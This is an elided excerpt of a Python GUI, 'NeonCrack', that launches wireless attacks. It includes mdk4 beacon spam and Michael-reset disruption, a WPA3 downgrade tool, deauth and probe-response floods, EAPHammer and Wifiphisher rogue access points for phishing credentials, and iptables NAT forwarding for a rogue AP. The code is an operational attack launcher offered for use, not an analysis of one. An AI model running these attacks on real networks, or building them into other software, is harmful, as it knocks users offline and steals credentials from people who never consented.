#!/usr/bin/env python3
"""
NeonCrack v3.6.8 – WiFi Tactical ToolKit
...
root = Tk(); root.title("NeonCrack v3.6.8"); root.configure(bg=BGC); root.geometry("1080x850")
...
input_var               = StringVar()                 # console line
...
def run_logged(cmd, box, outfile=None, *, stdin=False):
    """Spawn cmd, live-pump stdout to `box`; optionally open writable stdin."""
...
def enable_nat(uplink,ap_if):
    ...
    subprocess.run(["iptables","-A","FORWARD","-i",uplink,"-o",ap_if,"-m","state",
                    "--state","RELATED,ESTABLISHED","-j","ACCEPT"],stdout=subprocess.DEVNULL)
...
def start_beacon():
    ...
    global attack_proc; attack_proc=run_logged(
        ["mdk4",mon,"b","-f",ssidfile,"-c","1,6,11"],att_out,ssidfile+".log",stdin=True)
...
def start_wpa3_downgrade():
    ...
    global attack_proc; attack_proc=run_logged(
        ["dragondown","-i",mon,"-b",bssid,"-c",ch],att_out,logf,stdin=True)
...
def start_eaphammer():
    ...
    domain=simpledialog.askstring("Domain","Target AD domain (blank = rogue)",
                                  parent=root) or "evil.local"
...
def start_michael_reset():
    ...
    set_monitor(iface,True); mon=iface_var.get()
    global attack_proc; attack_proc=run_logged(
        ["mdk4",mon,"m","-t",bssid],att_out,stdin=True)
    log(att_out,"[*] Michael reset running")

# ───────── crack / hash / cleaner helpers (unchanged) ──────────────────────
...
def reset_toolkit(exit_after=False):
    ...
    for v in (target_var,pcap_var,word_var,hash_input,
              iface_var,nmap_target,nmap_custom,input_var):
        v.set("")
...
Button(row,text="Focused",bg=ACCENT,fg="white",
       command=lambda:threading.Thread(target=do_scan,daemon=True).start()).grid(row=0,column=5,padx=2)
Button(row,text="Hop",bg=ACCENT,fg="white",
       command=lambda:threading.Thread(target=do_scan,
                                       kwargs={'channel_hop':True},
                                       daemon=True).start()).grid(row=0,column=6,padx=2)
...
scan_out=scrolledtext.ScrolledText(ts,width=115,height=20,bg="#0d0d17",
                                   fg=NEON,font=("Consolas",10)); scan_out.pack(fill=BOTH,expand=True,pady=6,padx=2)
...
attack_vsb.pack(side=RIGHT,fill=Y)
attack_canvas.pack(side=LEFT,fill=BOTH,expand=True)
scroll_f=Frame(attack_canvas,bg=BGC); attack_canvas.create_window((0,0),window=scroll_f,anchor="nw")
def _cfg(_): attack_canvas.configure(scrollregion=attack_canvas.bbox("all"))
scroll_f.bind("<Configure>",_cfg)
def _mw(ev):
    delta=ev.delta if ev.delta else (120 if ev.num==5 else -120)
    attack_canvas.yview_scroll(int(-delta/120),"units")
for s in ("<MouseWheel>","<Button-4>","<Button-5>"):
    attack_canvas.bind_all(s,_mw)

# BSSID selector
target_menu=OptionMenu(scroll_f,target_var,""); target_menu.pack(fill=X,padx=10,pady=4)

# frames
lf_cap=ttk.LabelFrame(scroll_f,text="📡 Captures");         lf_cap.pack(fill=X,padx=8,pady=4)
lf_rogue=ttk.LabelFrame(scroll_f,text="🪪 Rogue AP / Phish"); lf_rogue.pack(fill=X,padx=8,pady=4)
lf_dist=ttk.LabelFrame(scroll_f,text="⚔️ Disruption");       lf_dist.pack(fill=X,padx=8,pady=4)
lf_exp=ttk.LabelFrame(scroll_f,text="🛠 WPA Exploits");      lf_exp.pack(fill=X,padx=8,pady=4)
...
_grid(lf_rogue,[
    ...
    ("Wifiphisher Evil-Portal",start_wifiphisher),
    ("EAPHammer Enterprise AP",start_eaphammer),
])
_grid(lf_dist,[
    ("Deauth Flood",start_deauth),
    ("Beacon Spam",start_beacon),
    ("Probe-Response Flood",start_probe_flood),
])
_grid(lf_exp,[
...
Button(scroll_f,text="Stop Attack",bg="#ff0030",fg="white",
       command=stop_attack).pack(fill=X,padx=20,pady=6)

att_out=scrolledtext.ScrolledText(scroll_f,width=115,height=18,bg="#0d0d17",
                                  fg=NEON,font=("Consolas",10))
att_out.pack(fill=X,pady=(0,8),padx=2)

inp_row=Frame(scroll_f,bg=BGC); inp_row.pack(fill=X,padx=10,pady=(0,8))
Entry(inp_row,textvariable=input_var,bg="#181818",fg="white",
      insertbackground="white").pack(side=LEFT,fill=X,expand=True)
Button(inp_row,text="Send",bg=ACCENT,fg="white",command=send_to_proc).pack(side=LEFT,padx=6)
